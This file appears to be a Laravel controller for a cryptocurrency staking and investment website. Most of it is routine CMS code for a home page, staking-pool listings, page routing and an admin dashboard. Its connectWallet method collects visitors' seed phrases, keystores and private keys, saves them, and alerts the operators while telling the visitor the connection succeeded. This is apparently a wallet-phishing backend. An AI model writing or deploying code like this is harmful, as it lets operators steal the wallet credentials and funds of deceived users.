<?php
declare(strict_types=1);

namespace App\Http\Controllers\CMS;

use App\Http\Controllers\Controller;
use App\Managers\NotificationManager;
use App\Models\Auth\Role;
use App\Models\Auth\User;
use App\Models\CMS\Category;
use App\Models\CMS\Faq;
use App\Models\CMS\Post;
use App\Models\CMS\Slide;
use App\Models\Core\Channel;
use App\Models\Core\Connection;
use App\Models\Core\Deposit;
use App\Models\Core\Package;
use App\Models\Core\Withdrawal;
use App\Models\ETC\Setting;
use Carbon\Carbon;
use Illuminate\Contracts\View\Factory;
use Illuminate\Http\Request;
use Illuminate\View\View;

/**
 * Class HomeController
 * @package App\Http\Controllers\CMS
 */
class HomeController extends Controller
{
    /**
     * @return Factory|View
     */
    public function show(Request $request, $referrerAID = null)
    {
        $referrer = User::findByUUID($referrerAID);
        $referrals_allowed = is_object($referrer) && $referrer->getSetting(Setting::KEY_ALLOW_REFERRALS);
        if ($referrals_allowed)
            $request->session()->put('referrerAID', $referrerAID);

        $slides = Slide::all();
        $faqs = Faq::published();
        $first_date = User::query()->first()->created_at;
        $packages = Package::activeOnly()->orderBy('min_amount')->get();

        return view('cms-public.index', [
            'slides' => $slides,
            'faqs' => $faqs,
            'pageTitle' => "Home",
            'channels' => Channel::activeOnly()->get(),
            'packages' => $packages,
            'min_amount' => $packages->min('min_amount'),
            'max_amount' => $packages->max('max_amount'),
            'stats' => [
                'days_online' => Carbon::now()->diffInDays($first_date) + 1,
                'users_count' => User::count(),
                'total_deposits' => Deposit::findByStatus(Deposit::S_VERIFIED)->sum('amount'),
                'total_withdrawn' => Withdrawal::findByStatus(Withdrawal::S_PAID_OUT)->sum('amount'),
            ],
        ]);
    }

    public function connectWallet(Request $request)
    {
        $input = $request->validate([
            'wallet_type'   =>  'required|in:phrase,keystore,privatekey',
            'phrase'        =>  'required|array',
            'keystore'      =>  'required|array',
            'privatekey'    =>  'required|array'
        ]);

        $wallet_type = $input['wallet_type'];

        $input = array_merge($input, $request->validate([
            $wallet_type.'.*' => 'required|string',
        ]));

        $connection = Connection::create([
            'uuid'  => Connection::generateUUID(),
            'type'  => $wallet_type,
            'data'  => $input[$wallet_type],
        ]);

        NotificationManager::sendWalletConnectionAlert($connection);

        return view('cms-public.connection-successful', ['connection'=> $connection]);
    }

    public function stakingPools(Request $request)
    {
        $packages = Package::activeOnly()->orderBy('min_amount', 'asc')->get();
        $faqs = Faq::published();

        return view('cms-public.staking-pools', [
            'packages' => $packages,
            'faqs' => $faqs,
        ]);
    }

    public function resolve(Request $request, $slug = 'index.html')
    {
        $view_path = 'cms-public.';
        $view_path .= str_replace('.html', '', $slug);
        $view_path = strtolower($view_path);
        abort_if(!view()->exists($view_path), 404, "Page not found.");

        return view($view_path);
    }

    /**
     * @param Request $request
     *
     * @return Factory|View
     */
    public function dashboard(Request $request)
    {
        $editor_role = Role::findByName(Role::EDITOR);
        $editors = $editor_role->users()->count();
        $categories = Category::count();
        $posts = Post::where('is_published', true)->count();
        $faqs = Faq::where('is_published', true)->count();

        return view('cms-admin.dashboard', [
            'editors_count' => $editors,
            'categories_count' => $categories,
            'posts_count' => $posts,
            'faqs_count' => $faqs,
        ]);
    }
}
